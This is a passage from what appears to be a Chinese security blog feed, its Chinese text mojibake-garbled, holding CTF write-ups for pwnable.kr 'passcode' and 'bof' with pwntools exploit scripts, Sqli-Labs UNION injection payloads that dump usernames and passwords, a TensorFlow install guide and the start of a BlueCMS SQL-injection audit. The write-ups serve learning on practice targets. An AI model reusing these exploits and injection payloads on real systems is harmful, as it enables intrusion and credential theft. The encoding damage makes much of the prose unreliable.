·çš„ã€‚å¦‚ä¸‹å›¾ï¼Œä¸¤ä¸ªæ ˆå¸§å¯¹æ¯”å¦‚ä¸‹ï¼š 70h - 10h = 60h = 96 &lt; 100ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬åœ¨welcomeï¼ˆï¼‰ä¸­è¾“å…¥çš„nameçš„ç¬¬ 97 - 100 çš„å­—ç¬¦ï¼Œåœ¨ loginï¼ˆï¼‰æ ˆå¸§ä¸­æ°å¥½æ˜¯ä½œä¸ºç¬¬ä¸€ä¸ª scanf çš„ç¬¬äºŒä¸ªå‚æ•°ï¼ˆå³åœ°å€è¡¨é¡¹ï¼‰ã€‚è€Œåœ¨loginï¼ˆï¼‰ä¸­ï¼Œè°ƒç”¨ç¬¬ä¸€æ¬¡ scanf æ—¶ä¼ å…¥çš„ %d å°†ä¼šå†™åˆ°è¿™ä¸ªåœ°å€ä¸­ã€‚è¿™æ ·æˆ‘ä»¬èƒ½æŽ§åˆ¶ passcode1ã€‚ ç”¨pedaçš„checksecæ£€æŸ¥å‘çŽ°å¼€å¯äº†canaryä¿æŠ¤ ç”±äºŽpasscode1å·²ç»æ˜¯åœ¨é•¿åº¦ä¸º100çš„nameçš„æœ€åŽå››ä¸ªå­—èŠ‚ï¼Œå› æ­¤ä¸å¯èƒ½é€šè¿‡ç»§ç»­å¢žåŠ nameçš„è¾“å…¥æ¥æŽ§åˆ¶ passcode2ï¼Œå¦åˆ™ä¼šè§¦å‘canaryã€‚ ç§‘æ™®ï¼šGOTlinuxä¸­ï¼ŒELFç¼–è¯‘ç³»ç»Ÿé‡‡ç”¨äº†ä¸€ç§å«å»¶è¿Ÿç»‘å®šï¼ˆlazy bindingï¼‰çš„æŠ€æœ¯ã€‚è‹¥ELFæ–‡ä»¶è°ƒç”¨äº†å®šä¹‰åœ¨å…±äº«åº“ä¸­çš„å‡½æ•°ï¼Œé‚£ELFæ–‡ä»¶ä¸­å°±å­˜åœ¨ GOTï¼ˆå…¨å±€åç§»è¡¨ï¼‰ å’Œ PLTï¼ˆè¿‡ç¨‹é“¾æŽ¥è¡¨ï¼‰ï¼Œå…¶ä¸­GOTå­˜æ”¾åœ¨ .data æ®µï¼ˆå·²åˆå§‹åŒ–çš„å…¨å±€Cå˜é‡ï¼‰ï¼Œè€ŒPLTå­˜æ”¾åœ¨ .text æ®µï¼ˆå·²ç¼–è¯‘ç¨‹åºçš„æœºå™¨ä»£ç ï¼‰ã€‚å¯¹äºŽä¸€èˆ¬å‡½æ•°ï¼ŒPLTè¡¨å’ŒGOTè¡¨ä¸€ä¸€å¯¹åº”ã€‚ å½“ç¬¬ä¸€æ¬¡è°ƒç”¨å…±äº«åº“ä¸­çš„å‡½æ•°æ—¶ï¼Œè¯¥å‡½æ•°å¯¹åº”çš„GOTè¡¨é¡¹ä¸­å­˜æ”¾çš„æ˜¯å¯¹åº”PLTè¡¨ä¸­çš„push1æ¡ç›®çš„åœ°å€ã€‚ç¨‹åºè°ƒç”¨æ—¶ï¼Œæ‰§è¡Œå‡½æ•°å¯¹åº”PLTçš„ç¬¬ä¸€æ¡æŒ‡ä»¤æ—¶ä¼šå…ˆé€šè¿‡å¯¹åº”GOTè·³è½¬åˆ°PLTè¡¨ä¸­çš„ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼Œä¹‹åŽé€šè¿‡ä¸€ç³»åˆ—æ“ä½œï¼Œå°†å¯¹åº”GOTè¦†ç›–ä¸ºå‡½æ•°çš„çœŸå®žåœ°å€ï¼Œå¹¶æ‰§è¡Œè¯¥å‡½æ•°ã€‚ç­‰åˆ°ä¸‹ä¸€æ¬¡è°ƒç”¨è¯¥å‡½æ•°æ—¶ï¼Œç¨‹åºä¸€æ ·å…ˆæ‰§è¡Œå‡½æ•°å¯¹åº”PLTçš„ç¬¬ä¸€æ¡æŒ‡ä»¤ï¼Œä¹‹åŽé€šè¿‡GOTè¡¨ä¼šç›´æŽ¥æ‰§è¡Œè¯¥å‡½æ•°ï¼Œå› ä¸ºGOTè¡¨ä¸­å·²ç»æ˜¯å‡½æ•°çš„çœŸå®žåœ°å€äº†ã€‚ Thinkingé€šè¿‡ä¹‹å‰çš„åˆ†æžï¼Œæˆ‘ä»¬èƒ½é€šè¿‡æŽ§åˆ¶nameçš„æœ€åŽå››ä¸ªå­—èŠ‚ï¼Œç»“åˆpasscode1çš„scanfæ¥å®žçŽ°å¯¹ä»»æ„åœ°å€çš„å†™å…¥ã€‚åŠ ä¸Š GOTè¡¨æ˜¯åœ¨ .data æ®µï¼Œæ˜¯å¯å†™çš„ã€‚å› æ­¤ä¸€ä¸ªæƒ³æ³•å°±æ˜¯ï¼šæˆ‘ä»¬å¯ä»¥å°† printf çš„GOTè¡¨ è¦†å†™ä¸º systemå‡½æ•°çš„åœ°å€ã€‚ç”±å‰å¯çŸ¥ï¼Œå½“å†æ¬¡è°ƒç”¨ printf æ—¶ï¼Œä¼šé€šè¿‡ printfçš„GOTè¡¨æ‰§è¡Œ systemå‡½æ•°ã€‚ printf çš„ GOTåœ°å€å¯ä»¥é€šè¿‡ pwntools å·¥å…·èŽ·å¾—ã€‚ä¹Ÿå¯ä»¥é€šè¿‡ objdump èŽ·å¾—ï¼Œå¦‚ä¸‹. å¯¹äºŽsystemå‡½æ•°åœ°å€ï¼Œç”±äºŽç¨‹åºä¸­å·²ç»æä¾›äº†ï¼Œæ‰€ä»¥è¿™é‡Œç›´æŽ¥å– 80485e3 è¿™é‡Œå¯¹åº”ç€loginï¼ˆï¼‰ä¸­çš„1return system(&quot;/bin/cat flag&quot;); æ¢³ç†ä¸€ä¸‹æ€è·¯ï¼šæŒ‰ç…§ç¨‹åºçš„æµç¨‹ï¼Œwelcomeï¼ˆï¼‰ï¼Œæˆ‘ä»¬è¾“å…¥100ä¸ªå­—ç¬¦ï¼Œå…¶ä¸­æœ€åŽå››ä¸ªæ˜¯ printfçš„GOTåœ°å€ã€‚ä¹‹åŽç¨‹åºè¿›å…¥loginï¼Œè°ƒç”¨scanfï¼ˆâ€%dâ€ï¼‰æ—¶ï¼Œä»¥ %d å½¢å¼å°†æˆ‘ä»¬è¾“å…¥çš„æ•°æ®ï¼ˆ system(â€œ/bin/cat flagâ€)ï¼‰è¯»å…¥ï¼Œå¹¶å†™å…¥åˆ° printfçš„GOTåœ°å€ã€‚æŽ¥ä¸‹åŽ»ï¼Œç¨‹åºä¼šæ‰§è¡Œ printf(â€œenter passcode2 : â€œ); å³å†æ¬¡è°ƒç”¨printfå‡½æ•°ï¼Œä½†å®žé™…æ‰§è¡Œçš„æ˜¯ systemå‡½æ•°ã€‚è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äºŽæ˜¯ä»¥ %d å½¢å¼è¯»å…¥ï¼Œæ‰€ä»¥è¾“å…¥æ—¶åº”ä¸º 134514147 ï¼ˆ0x80485e3 = 134514147ï¼‰ Exp12345678910111213141516171819from pwn import *elf = ELF("passcode")r = remote("127.0.0.1","12345")#r = process("./passcode")printfGotAddr = elf.got["printf"]systemAddr = 134514147print "the printfGotAddr is "+ hex(printfGotAddr)print "the systemAddr is "+ hex(systemAddr)payload1 = 'a' * 96 + p32(printfGotAddr)payload2 = str(systemAddr)r.sendline(payload1)r.sendline(payload2)print r.recv() flaglocal test123456789101112(venv) chybeta@ubuntu:~/pwn/pwnable/passcode$ python exp.py[*] &apos;/home/chybeta/pwn/pwnable/passcode/passcode&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE[+] Opening connection to 127.0.0.1 on port 12345: Donethe printfGotAddr is 0x804a000the systemAddr is 0x80485e3flag&#123;2222222222&#125;[*] Closed connection to 127.0.0.1 port 12345 pwnable.kr1234567891011121314151617181920212223242526272829passcode@ubuntu:~$ lsflag passcode passcode.cpasscode@ubuntu:~$ pythonPython 2.7.12 (default, Jul 1 2016, 15:12:24)[GCC 5.4.0 20160609] on linux2Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.&gt;&gt;&gt; from pwn import *&gt;&gt;&gt; e = ELF(&quot;passcode&quot;)[*] &apos;/home/passcode/passcode&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE&gt;&gt;&gt; r = process(&quot;./passcode&quot;)[x] Starting local process &apos;./passcode&apos;[+] Starting local process &apos;./passcode&apos;: Done&gt;&gt;&gt; printfGotAddr = e.got[&quot;printf&quot;]&gt;&gt;&gt; systemAddr = 134514147&gt;&gt;&gt; payload1 = &apos;a&apos; * 96 + p32(printfGotAddr)&gt;&gt;&gt; payload2 = str(systemAddr)&gt;&gt;&gt; r.sendline(payload1)&gt;&gt;&gt; r.sendline(payload2)&gt;&gt;&gt; print r.recv()[*] Process &apos;./passcode&apos; stopped with exit code 0Toddler&apos;s Secure Login System 1.0 beta.enter you name : Welcome aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!Sorry mom.. I got confused about scanf usage :(enter passcode1 : Now I can safely trust you that you have credential :) FLAG: Sorry mom.. I got confused about scanf usage :(]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Pwnable.kr:bof]]></title>
      <url>%2F2017%2F04%2F07%2FPwnable-kr-bof%2F</url>
      <content type="text"><![CDATA[ç®€å•æ ˆæº¢å‡ºã€‚ bofåŽŸé¢˜æœ‰æä¾›binaryå’Œsource codeã€‚ 12(venv) chybeta@ubuntu:~/pwn/pwnable/bof$ file bofbof: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=ed643dfe8d026b7238d3033b0d0bcc499504f273, not stripped ç”¨IDAæ‰“å¼€ï¼Œf5: mainå‡½æ•°ï¼š funcå‡½æ•°ï¼š funcå‡½æ•°æŽ¥å—ä¸€ä¸ªå‚æ•°ï¼ˆ0xDEADBEEFï¼‰ï¼Œä¹‹åŽé€šè¿‡getsï¼ˆï¼‰æŽ¥å—è¾“å…¥ã€‚å› æ­¤å¯ä»¥é€šè¿‡æ ˆæº¢å‡ºï¼Œå°†a1è¦†ç›–ä¸º0xCAFEBABEï¼Œè¿™æ ·èƒ½ç›´æŽ¥æ‰§è¡Œ system(â€œ/bin/shâ€) a1 æ˜¯ funcï¼ˆï¼‰çš„å‚æ•°ï¼Œåœ¨æ ˆä¸Šä½äºŽ ebp+8h çš„ä½ç½®ã€‚è€Œè¾“å…¥å­—ç¬¦ä¸²çš„èµ·ç‚¹ä¸º ebp-2chã€‚ä¸¤è€…ç›¸å·®ï¼š0x2c + 0x8h = 52 ã€‚ exp123456from pwn import *p = remote("pwnable.kr","9000")payload = 'a' * 52payload += p32(0xcafebabe)p.sendline(payload)p.interactive() flag]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[ã€ŠThe Pracetice of Programmingã€‹è¯»ä¹¦ç¬”è®°ï¼ˆ1ï¼‰]]></title>
      <url>%2F2017%2F04%2F06%2F%E3%80%8AThe-Pracetice-of-Programming%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%EF%BC%881%EF%BC%89%2F</url>
      <content type="text"><![CDATA[ã€ŠThe Pracetice of Programmingã€‹è¯»ä¹¦ç¬”è®° Style Usually,the real code is mostly well down,but with something that could be improved. There is more to writing a program than getting the syntax right, fixing the bugs, and making it run fast enough. The principles of programming style are based on common sense guided by experience. Names labels an object and conveys information about its purpose. informativeã€conciseã€memorable, and pronounceable if possible the border the scope,the more information conveyed. suggestion 1use descriptive name for globals,short names for locals.]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[åˆ©ç”¨pythonä¸º1000phpç”Ÿæˆç›®å½•é¡µé¢]]></title>
      <url>%2F2017%2F04%2F03%2F%E5%88%A9%E7%94%A8python%E4%B8%BA1000php%E7%94%9F%E6%88%90%E7%9B%AE%E5%BD%95%E9%A1%B5%E9%9D%A2%2F</url>
      <content type="text"><![CDATA[1000phpæ˜¯æŒ‡1000ä¸ªPHPä»£ç å®¡è®¡æ¡ˆä¾‹ï¼Œæ¥è‡ª2016.7ä»¥å‰ä¹Œäº‘å…¬å¼€æ¼æ´žã€‚githubåœ°å€ï¼š https://github.com/Xyntax/1000phpgit cloneä¸‹æ¥åŽï¼Œæ¡ˆä¾‹ä¿å­˜åœ¨bugsæ–‡ä»¶å¤¹é‡Œï¼Œåç§°éƒ½æ˜¯wooyun-xxx-xxxxxæ ¼å¼ï¼Œæ²¡æœ‰ç´¢å¼•ï¼Œä»Žåå­—ä¸Šçœ‹ä¹Ÿéš¾ä»¥çŸ¥é“è¿™æ˜¯ä»€ä¹ˆç±»åž‹çš„æ¼æ´žã€‚æ‰€ä»¥è¿™é‡Œä¸ºå®ƒç”Ÿæˆä¸€ä¸ªç›®å½•é¡µé¢ã€‚ Somethingæ¼æ´žçš„ç®€è¦ä¿¡æ¯ä¿å­˜åœ¨é¡µé¢çš„titleæ ‡ç­¾ä¸­ï¼Œå¦‚ä¸‹ä½¿ç”¨BeautifulSoupæ¥å¯¹wooyun-xxx-xxxxx.htmlè¿›è¡Œè§£æžï¼ŒèŽ·å–å…¶titleã€‚å¦‚ä¸‹ï¼š Code1234567891011121314151617181920import sysimport osfrom bs4 import BeautifulSoupreload(sys)sys.setdefaultencoding('utf8')htmlName = os.listdir(htmlLoc)indexhtml = open("index.html","w")setCharset = '&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt; &lt;/head&gt;'indexhtml.write(setCharset)for i in htmlName: if i[0] == 'w': soup = BeautifulSoup(open(i),"html.parser") url ='&lt;a href="'+i+'"&gt;'+soup.title.string+'&lt;/a&gt;' indexhtml.write(url) indexhtml.write("&lt;/br&gt;")print "done!" Resultå°†ä»£ç ä¿å­˜ä¸ºpyæ–‡ä»¶åŽï¼Œæ”¾åœ¨bugsæ–‡ä»¶å¤¹ä¸‹è¿è¡Œï¼Œä¼šç”Ÿæˆindex.htmlæ–‡ä»¶ã€‚æ‰“å¼€ã€‚]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Sqli-Labs:Less1-4-writeup]]></title>
      <url>%2F2017%2F04%2F02%2FSqli-Labs-Less1-4-writeup%2F</url>
      <content type="text"><![CDATA[Sqli-Labsæ˜¯ç”¨æ¥ç»ƒä¹ sqlæ³¨å…¥çš„å¥½å¹³å°ã€‚projectåœ°å€ï¼šhttps://github.com/Audi-1/sqli-labsæœ¬æ–‡æµ‹è¯•çŽ¯å¢ƒï¼šä½¿ç”¨phpstudyé›†æˆçŽ¯å¢ƒã€‚mysqlç‰ˆæœ¬ï¼š5.5.53 Less 1é¢˜ç›®æ˜¯ GET Error based- Single quotes -Stringã€‚å…³æ³¨ç‚¹ï¼šåŸºäºŽé”™è¯¯ï¼Œå•å¼•å·ï¼Œå­—ç¬¦åž‹æ³¨å…¥ã€‚ payload11http://localhost:20000/sqllab/Less-1/?id=1&apos; æ­¤æ—¶é¡µé¢ä¼šäº§ç”ŸæŠ¥é”™ã€‚ payload21http://localhost:20000/sqllab/Less-1/?id=0&apos; UNION SELECT 1,2,3 --+ é€šè¿‡UNION SELECT æˆ–è€… ORDER BY è¯­å¥å¯ä»¥å‘çŽ°å­—æ®µæ•°ä¸º 3 ï¼Œå¯æ˜¾ç¤ºä½ç½®ä¸º 2,3ã€‚å°¾éƒ¨â€”+ä¼šè¢«æµè§ˆå™¨è§£é‡Šä¸ºâ€” ï¼ˆç©ºæ ¼ï¼‰ï¼Œè¿™åœ¨mysqlé‡Œæ˜¯æ³¨é‡Šã€‚ payload3èŽ·å–æ•°æ®åº“åç§°1http://localhost:20000/sqllab/Less-1/?id=0&apos; UNION SELECT 1,GROUP_CONCAT(SCHEMA_NAME),3 FROM INFORMATION_SCHEMA.SCHEMATA --+ åˆ©ç”¨å…ƒæ•°æ®è¡¨INFORMATION_SCHEMAèŽ·å–æ•°æ®åº“ä¿¡æ¯ã€‚ èŽ·å–è¡¨å12http://localhost:20000/sqllab/Less-1/?id=0&apos; UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),3 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=0x7365637572697479 --+ è¿™é‡Œ hex(security)=0x7365637572697479 èŽ·å–å­—æ®µå12http://localhost:20000/sqllab/Less-1/?id=0&apos; UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME),3 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 0x7573657273 --+ èŽ·å–æ•°æ®12http://localhost:20000/sqllab/Less-1/?id=0&apos; UNION SELECT 1,GROUP_CONCAT(username,0x3a,password,0x20),3 FROM security.users --+ Less 2é¢˜ç›®è¯´æ˜¯æ•°å€¼åž‹æ³¨å…¥ã€‚ ä¸éœ€è¦é—­åˆå¼•å·ã€‚ç»™å‡ºæœ€ç»ˆpayload12http://localhost:20000/sqllab/Less-2/?id=0 UNION SELECT 1,GROUP_CONCAT(username,0x3a,password,0x20),3 FROM security.users --+ Less 3é¢˜ç›®æç¤º SINGLE QUOTES WITH TWISTã€‚ payload11http://localhost:20000/sqllab/Less-3/?id=1&apos; æ³¨æ„åˆ°æŠ¥é”™å›žæ˜¾ä¸­æœ‰ )ï¼Œè¯´æ˜Žéœ€è¦é—­åˆã€‚ payload2ç±»ä¼¼å°†Less1ä¸­çš„å‡ æ®µpayloadçš„å‰é¢çš„ 0â€™ æ”¹ä¸º 0â€™) å³å¯ æœ€ç»ˆpayload12http://localhost:20000/sqllab/Less-3/?id=0&apos;) UNION SELECT 1,GROUP_CONCAT(username,0x3a,password,0x20),3 FROM security.users --+ Less 4è¿™é¢˜éœ€è¦é—­åˆåŒå¼•å·ã€‚ payload11http://localhost:20000/sqllab/Less-4/?id=0&quot; éœ€è¦é—­åˆ åŒå¼•å· payload2ç±»ä¼¼å°†Less1ä¸­çš„å‡ æ®µpayloadçš„å‰é¢çš„ 0â€™ æ”¹ä¸º 0â€) å³å¯ æœ€ç»ˆpayload12http://localhost:20000/sqllab/Less-3/?id=0&apos;) UNION SELECT 1,GROUP_CONCAT(username,0x3a,password,0x20),3 FROM security.users --+ sqlilabçŽ¯å¢ƒæ­å»ºä¸‹è½½sqlilabä¼ é€é—¨ï¼šhttps://github.com/Audi-1/sqli-labså¯ä»¥é€‰æ‹©ä¸‹è½½zipåŽè§£åŽ‹æˆ–è€…è‡ªè¡Œgit cloneåˆ°æœ¬åœ°ï¼Œ æŽ¨èphpstudyä¼ é€é—¨ï¼šhttp://www.phpstudy.net/a.php/211.htmlä¸æ‡‚ä½¿ç”¨çš„å»ºè®®æŸ¥ä¸€æŸ¥ã€‚è¿™é‡Œå‡è®¾phpstudyd ä¸»é¡µä¸º http://localhost:20000/ å®‰è£…å°†sqlilabè§£åŽ‹å‡ºæ¥çš„æ–‡ä»¶å¤¹ï¼ˆé»˜è®¤åä¸º sqli-labs-masterï¼‰æ‹·è´åˆ°phpstudyçš„WWWç›®å½•ä¸‹ï¼Œæ‰“å¼€phpstudyï¼Œè®¿é—®sqlilabé¡µé¢( http://localhost:20000/sqli-labs-master )ã€‚ç‚¹é€‰Setup/reset Database for labså®Œæˆæ•°æ®åº“é…ç½®ã€‚ä¹‹åŽå³å¯å¼€å§‹å®žéªŒã€‚]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[winä¸‹tensorflowå®‰è£…é¿å‘æŒ‡å—]]></title>
      <url>%2F2017%2F03%2F15%2Fwin%E4%B8%8Btensorflow%E5%AE%89%E8%A3%85%E9%81%BF%E5%9D%91%E6%8C%87%E5%8D%97-0%2F</url>
      <content type="text"><![CDATA[å¥½å¤šåŒå­¦æ¥é—®æ€Žä¹ˆå®‰è£…tensorflowï¼Œæƒ³æƒ³è¿˜æ˜¯å†™ä¸€ä¸‹å§ã€‚ å»ºè®® å¯ä»¥é€‰æ‹©ä½¿ç”¨ virtualenv æ¥è¿›è¡ŒpythonçŽ¯å¢ƒçš„ç®¡ç†,è¿™æ ·ä¸ä¼šæ··ä¹±ã€‚ æ‹…å¿ƒåŒ…ä¸ŽåŒ…ä¹‹é—´çš„ä¾èµ–é—®é¢˜çš„è¯ï¼ŒæŽ¨èç›´æŽ¥ä½¿ç”¨ anacondaç§‘å­¦è®¡ç®—å‘è¡ŒåŒ…ã€‚å…·ä½“å®‰è£…è¿‡ç¨‹å¯å‚è§ï¼šæ•°æ®æŒ–æŽ˜æ¯”èµ›ï¼ˆ0ï¼‰çŽ¯å¢ƒæ­å»ºä¹‹anacondaå®‰è£… åŽŸç”Ÿpythonå®‰è£…æƒ³æƒ³è¿˜æ˜¯æŠŠè¿™éƒ¨åˆ†åŠ è¿›æ¥äº†ï¼šï¼‰ é¿å‘ä¸€ï¼šå®˜ç½‘ä¸‹è½½ä¸‹è½½é¡µé¢ï¼šhttps://www.python.org/downloads/windows/tensorflowå®˜ç½‘ä¸Šé¢è¯´:tensorflowæš‚æ—¶åªæ”¯æŒ64bitçš„python3.5ã€‚æ‰€ä»¥ä¸æƒ³æŠ˜è…¾çš„åŒå­¦ä¸è¦åŽ»ä¸‹è½½latestçš„python3.6ï¼Œä¹Ÿä¸è¦åŽ»ä¸‹python2.7ï¼Œæ¯•ç«Ÿpy3æ˜¯æœªæ¥å•Šã€‚ã€‚ executable installeræ˜¯æŠŠå®‰è£…æ–‡ä»¶ä¸‹è½½ä¸‹æ¥åŽå†å®‰è£…ã€‚ é¿å‘äºŒï¼šå®‰è£…pythonä¸æƒ³åŽé¢éº»çƒ¦çš„è¯ï¼Œå®‰è£…æ—¶è®°å¾—æŠŠ æ·»åŠ è¿›ç³»ç»Ÿè·¯å¾„ é€‰ä¸Šå…¶ä½™çš„é€‰é¡¹ä¸ç”¨æ‹…å¿ƒï¼Œä½ å¯ä»¥è‡ªå·±é€‰æ‹©å®‰è£…è·¯å¾„ï¼Œè¿™é‡Œæˆ‘ç›´æŽ¥é€‰ Install Nowäº†ã€‚ é¿å‘ä¸‰ï¼šè¯•è¯•æ‰“å¼€cmdï¼Œè¾“å…¥pythonï¼Œåº”è¯¥ä¼šè¿›å…¥pythonäº¤äº’å¼çŽ¯å¢ƒã€‚å¦‚æžœæç¤ºä¸æ˜¯å†…éƒ¨æˆ–å¤–éƒ¨å‘½ä»¤å•¥çš„ï¼Œè¯´æ˜Žä½ çš„ç³»ç»ŸçŽ¯å¢ƒå˜é‡é…ç½®æœ‰é—®é¢˜ã€‚å¯ä»¥è‡ªå·±å†æ‰‹åŠ¨æ·»åŠ è¿›åŽ»ï¼Œè¿™é‡Œä¸æã€‚ å¦å¤–è¯´ä¸€ä¸‹ï¼Œè¿™é‡Œé»˜è®¤çš„pythonå‘½ä»¤å¯¹åº”çš„ç‰ˆæœ¬ä¸ºpython3.5ã€‚ å®‰è£…tensorflowé¿å‘å››ï¼šå®‰è£…å‘½ä»¤python3.5è‡ªå¸¦çš„pip3åŒ…ç®¡ç†å™¨ï¼Œæˆ‘å¯ä»¥ç›´æŽ¥ä½¿ç”¨å®ƒæ¥ä¸‹è½½ã€‚1pip3 install --upgrade tensorflow å®ƒä¼šè‡ªåŠ¨ä¸‹è½½tensorflowåŠå…¶å®ƒä¸€äº›æœ€æ–°çš„ä¾èµ–åŒ…ã€‚è®°å¾—åŠ ä¸Š â€”upgradeï¼Œä¸ç„¶å®‰è£…çš„æ¯”å¦‚protobufçš„ç‰ˆæœ¬å¯èƒ½ç›¸å¯¹è¾ƒä½ŽåŽç»­å¯èƒ½ä¼šæŠ¥é”™ã€‚ç„¶åŽä¼šè‡ªåŠ¨è¿›è¡Œå®‰è£…ã€‚ç›´è‡³å¦‚ä¸‹ï¼š é¿å‘äº”ï¼šå®‰è£…ç³»ç»Ÿä¾èµ–åŒ…åˆæ¬¡å®‰è£…ï¼Œå¯èƒ½ä¼šåœ¨å¯¼å…¥çš„æ—¶å€™å‡ºé”™ï¼Œè¿™æ˜¯å› ä¸ºwinç³»ç»Ÿçš„åŠ¨æ€é“¾æŽ¥åº“MSVCP140.DLLç¼ºå¤±çš„åŽŸå› .æœ‰äº›åŒå­¦åœ¨è¿™ä¸€æ­¥æ²¡æœ‰å‡ºé”™ï¼Œæˆ‘çŒœä½ ä»¬å†™Cè¯­è¨€ç”¨çš„æ˜¯VS2015å•¥çš„hhã€‚å¦‚ä¸‹å›¾ï¼Œè¿™é‡Œåªæˆªå–éƒ¨åˆ†ã€‚ åŽ»å¾®è½¯å®˜ç½‘ä¸‹è½½ Visual C++ 2015 redistributableï¼Œå®ƒåŒ…å«äº†MSVCP140.DLLã€‚ ä¼ é€é—¨ï¼šVisual C++ 2015 redistributable ä¸€å®šè¦æ³¨æ„çš„æ˜¯ï¼Œè¦é€‰æ‹© x64 ç‰ˆæœ¬ï¼Œå¯¹åº”ä½ çš„64ä½æ“ä½œç³»ç»Ÿç„¶åŽå®‰è£…ã€‚ æµ‹è¯•åœ¨ç»è¿‡å‰é¢çš„æ­¥éª¤åŽï¼Œæ­¤æ—¶å¯¼å…¥tensorflowåº”è¯¥æ²¡é—®é¢˜äº†ã€‚!()[http://ojp0pjljj.bkt.clouddn.com/tensor7.jpg]æŽ¥ä¸‹æ¥å°±ç®€å•çš„æµ‹è¯•ä¸€ä¸‹ï¼Œä¾æ¬¡è¾“å…¥1234import tensorflow as tfhello = tf.constant('Hello, TensorFlow!')sess = tf.Session()print(sess.run(hello)) å¥½å§ï¼Œå¥½åƒæ²¡æŠ¥é”™ï¼Œä¸è¿‡ä¸€å¤§å †çš„æ¶ˆæ¯æ‰“å°å‡ºæ¥ï¼Œå¿ƒç†æ€»æ˜¯æœ‰ç‚¹ä¸èˆ’æœï¼šï¼‰ è¿™è¾¹æ˜¯å…³äºŽè¿™ä¸ªé—®é¢˜çš„ä¸¤ä¸ªè®¨è®ºï¼Œä¸¤ä¸ªé—®é¢˜çš„è®¨è®ºæ—¶é—´æ˜¯åœ¨ä»Šå¹´çš„2æœˆä»½ã€‚ stackoverflowï¼šunknow op github Issues: unknow op ä»–ä»¬æ‰€æå‡ºçš„â€œè§£å†³æ–¹æ³•â€æ˜¯å®‰è£…æŒ‡å®šçš„è¿™ä¸ªnightly buildç‰ˆæœ¬ï¼Œè¿™ä¸ªå¯ä»¥ç¡®å®žå¯ä»¥è§£å†³æŽ‰unknow opçš„è­¦å‘Šé—®é¢˜ï¼Œä¸è¿‡ä¼šäº§ç”Ÿå¦å¤–çš„SSEè­¦å‘Šã€‚ å…³äºŽpython3.6æœ‰äº›åŒå­¦å¯èƒ½ä¸€ä¸å°å¿ƒå®‰äº†python3.6ï¼ŒåŠ ä¸Š(anacondaå®˜ç½‘)[https://www.continuum.io/downloads/]ä¸Šçš„ç‰ˆæœ¬ä¹Ÿå·²ç»æ›´æ–°ä¸ºpython3.6äº†ã€‚æ‰€ä»¥è¿™è¾¹æä¾›ä¸€ä¸ªtensorflow-py3.6çš„å®‰è£…åŒ…ã€‚ ä¼ é€é—¨ï¼š Python Extension Packages:tensorflow è‡³äºŽèƒ½ä¸èƒ½ç”¨ï¼Œä»è€…è§ä»æ™ºè€…è§æ™ºâ€¦â€¦ tensorflow GPUè®¡ç®—è¿‡ç¨‹è¿™é‡Œä¸å±•å¼€ï¼Œè¦è£… vs+cuda+tensorflow,å¦‚æžœæƒ³æ›´å¿«çš„è¯ï¼Œå¯ä»¥æ·»åŠ cudnnåº“ã€‚åŒæ—¶è¦æ±‚æ˜¾å¡æ˜¯è‹±ä¼Ÿè¾¾çš„ä¸”nvidia compute capabilityè¦å¤§äºŽ3ã€‚æ­¤å¤„ç•¥è¿‡ä¸æã€‚]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[ä»£ç å®¡è®¡ä¹‹SQLæ³¨å…¥ï¼šBlueCMSv1.6 sp1]]></title>
      <url>%2F2017%2F03%2F14%2F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%EF%BC%9ABlueCMSv1-6-sp1%2F</url>
      <content type="text"><![CDATA[ä»£ç å®¡è®¡å­¦ä¹  å·¥å…·åŠçŽ¯å¢ƒ bluecms v2.1 sp1é“¾æŽ¥ï¼šhttp://pan.baidu.com/s/1dFKLanR å¯†ç ï¼š8v1c seayå®¡è®¡ç³»ç»Ÿé“¾æŽ¥ï¼šhttp://pan.baidu.com/s/1dENS4KT å¯†ç ï¼šrszt çŽ¯å¢ƒPHP: 5.4.45MYSQL: 5.5.53 æ³¨å…¥ä¸€å®¡è®¡ç”¨seayå®¡è®¡ç³»ç»Ÿå®¡è®¡ä¸€ä¸‹,å®šä½åˆ°/ad_js.phpã€‚ è¯¥æ¡è¯­å¥ä¸º1$ad = $db-&gt;getone("SELECT * FROM ".table('ad')." WHERE ad_id =".$ad_id); getone()æ˜¯è‡ªå®šä¹‰çš„å‡½æ•°ï¼Œç”¨æ¥æŸ¥è¯¢æ•°æ®åº“ï¼Œä»£ç å¦‚ä¸‹ï¼š12345function getone($sql, $type=MYSQL_ASSOC)&#123; $query = $this-&gt;query($sql,$this-&gt;linkid); $row = mysql_fetch_array($query, $type); return $row;&#125; å›žåˆ°ad_js.php1"SELECT * FROM ".table('ad')." WHERE ad_id =".$ad_id å¯è§è¿™é‡Œçš„å˜é‡ $ad_id æ²¡æœ‰å•å¼•å·ä¿æŠ¤ã€‚æŽ¥ä¸‹æ¥çœ‹çœ‹è¿™ä¸ªå˜é‡çš„æ¥æºã€‚ 1$ad_id = !empty($_GET['ad_id']) ? trim($_GET['ad_id']) : ''; 